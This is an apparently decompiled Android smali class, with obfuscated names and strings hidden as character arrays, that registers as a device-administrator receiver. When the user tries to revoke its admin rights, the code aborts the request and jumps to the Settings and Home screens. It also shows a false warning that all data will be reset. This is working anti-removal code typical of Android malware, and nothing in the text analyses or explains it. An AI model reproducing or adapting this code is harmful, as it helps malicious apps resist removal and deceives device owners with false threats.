.class public Lnsuj/wbbgue/bmzbhnz/Gqvepzigg;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "Gqvepzigg.java"


# static fields
.field static final TAG:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    .prologue
    .line 9
    new-instance v0, Ljava/lang/String;

    const/16 v1, 0x17

    new-array v1, v1, [C

    fill-array-data v1, :array_0

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([C)V

    sput-object v0, Lnsuj/wbbgue/bmzbhnz/Gqvepzigg;->TAG:Ljava/lang/String;

    return-void

    nop

    :array_0
    .array-data 2
        0x44s
        0x65s
        0x6ds
        0x6fs
        0x44s
        0x65s
        0x76s
        0x69s
        0x63s
        0x65s
        0x41s
        0x64s
        0x6ds
        0x69s
        0x6es
        0x52s
        0x65s
        0x63s
        0x65s
        0x69s
        0x76s
        0x65s
        0x72s
    .end array-data
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 5
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/high16 v4, 0x10000000

    .line 31
    invoke-virtual {p0}, Lnsuj/wbbgue/bmzbhnz/Gqvepzigg;->abortBroadcast()V

    .line 32
    new-instance v0, Landroid/content/Intent;

    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x19

    new-array v3, v3, [C

    fill-array-data v3, :array_0

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 33
    .local v0, "localIntent1":Landroid/content/Intent;
    const/high16 v2, 0x40000000    # 2.0f

    invoke-virtual {v0, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 34
    invoke-virtual {v0, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 35
    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 36
    new-instance v1, Landroid/content/Intent;

    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x1a

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 37
    .local v1, "localIntent2":Landroid/content/Intent;
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x1c

    new-array v3, v3, [C

    fill-array-data v3, :array_2

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    .line 38
    invoke-virtual {v1, v4}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 39
    invoke-virtual {p1, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 43
    new-instance v2, Ljava/lang/String;

    const/16 v3, 0x6b

    new-array v3, v3, [C

    fill-array-data v3, :array_3

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    return-object v2

    .line 32
    :array_0
    .array-data 2
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x2es
        0x73s
        0x65s
        0x74s
        0x74s
        0x69s
        0x6es
        0x67s
        0x73s
        0x2es
        0x53s
        0x45s
        0x54s
        0x54s
        0x49s
        0x4es
        0x47s
        0x53s
    .end array-data

    .line 36
    nop

    :array_1
    .array-data 2
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x2es
        0x69s
        0x6es
        0x74s
        0x65s
        0x6es
        0x74s
        0x2es
        0x61s
        0x63s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x2es
        0x4ds
        0x41s
        0x49s
        0x4es
    .end array-data

    .line 37
    :array_2
    .array-data 2
        0x61s
        0x6es
        0x64s
        0x72s
        0x6fs
        0x69s
        0x64s
        0x2es
        0x69s
        0x6es
        0x74s
        0x65s
        0x6es
        0x74s
        0x2es
        0x63s
        0x61s
        0x74s
        0x65s
        0x67s
        0x6fs
        0x72s
        0x79s
        0x2es
        0x48s
        0x4fs
        0x4ds
        0x45s
    .end array-data

    .line 43
    :array_3
    .array-data 2
        0x54s
        0x68s
        0x69s
        0x73s
        0x20s
        0x61s
        0x63s
        0x74s
        0x69s
        0x6fs
        0x6es
        0x20s
        0x77s
        0x69s
        0x6cs
        0x6cs
        0x20s
        0x72s
        0x65s
        0x73s
        0x65s
        0x74s
        0x20s
        0x61s
        0x6cs
        0x6cs
        0x20s
        0x79s
        0x6fs
        0x75s
        0x72s
        0x20s
        0x64s
        0x61s
        0x74s
        0x61s
        0x2es
        0x5cs
        0x6es
        0x5cs
        0x6es
        0x43s
        0x6cs
        0x69s
        0x63s
        0x6bs
        0x20s
        0x5cs
        0x22s
        0x59s
        0x65s
        0x73s
        0x5cs
        0x22s
        0x20s
        0x61s
        0x6es
        0x64s
        0x20s
        0x79s
        0x6fs
        0x75s
        0x72s
        0x27s
        0x73s
        0x20s
        0x64s
        0x65s
        0x76s
        0x69s
        0x63s
        0x65s
        0x20s
        0x77s
        0x69s
        0x6cs
        0x6cs
        0x20s
        0x72s
        0x65s
        0x62s
        0x6fs
        0x6fs
        0x74s
        0x20s
        0x61s
        0x6es
        0x64s
        0x20s
        0x5cs
        0x22s
        0x4es
        0x6fs
        0x5cs
        0x22s
        0x20s
        0x66s
        0x6fs
        0x72s
        0x20s
        0x63s
        0x61s
        0x6es
        0x63s
        0x65s
        0x6cs
        0x2es
    .end array-data
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 48
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    .line 50
    return-void
.end method
